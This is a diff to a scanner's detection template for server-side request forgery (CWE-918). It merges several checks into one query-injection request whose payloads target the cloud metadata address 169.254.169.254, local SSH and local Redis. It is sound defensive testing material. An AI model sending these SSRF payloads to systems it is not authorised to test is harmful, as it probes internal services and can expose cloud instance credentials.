@@ -8,7 +8,13 @@ info:
     cwe: "CWE-918"
 requests:
   - method: GET
-    path: "/fetch?url=http://169.254.169.254/latest/meta-data/"
+    path: "/"
+    attack: inject
+    inject_in: query
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://127.0.0.1:22/"
+      - "http://localhost:6379/"
     headers:
       User-Agent: "Valayam-Scanner/2.0"
     matchers:
@@ -18,59 +24,11 @@ requests:
           - "ami-id"
           - "instance-id"
           - "public-keys"
-          - "security-credentials"
-          - "iam/"
-          - "local-hostname"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: and
-
-  - method: GET
-    path: "/proxy?url=http://127.0.0.1:22/"
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "SSH"
-          - "OpenSSH"
-          - "refused"
-          - "Connection reset"
+          - "SSH-2.0-OpenSSH"
+          - "redis_version"
       - type: status
         part: status
         status:
           - 200
           - 502
-    matcher_condition: or
-
-  - method: GET
-    path: "/api/external?host=metadata.google.internal"
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "project/"
-          - "computeMetadata"
-          - "google"
-      - type: status
-        part: status
-        status:
-          - 200
     matcher_condition: and
-
-  - method: GET
-    path: "/load?url=http://localhost:6379/"
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "redis"
-          - "redis_version"
-          - "-ERR"
-          - "+OK"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: or
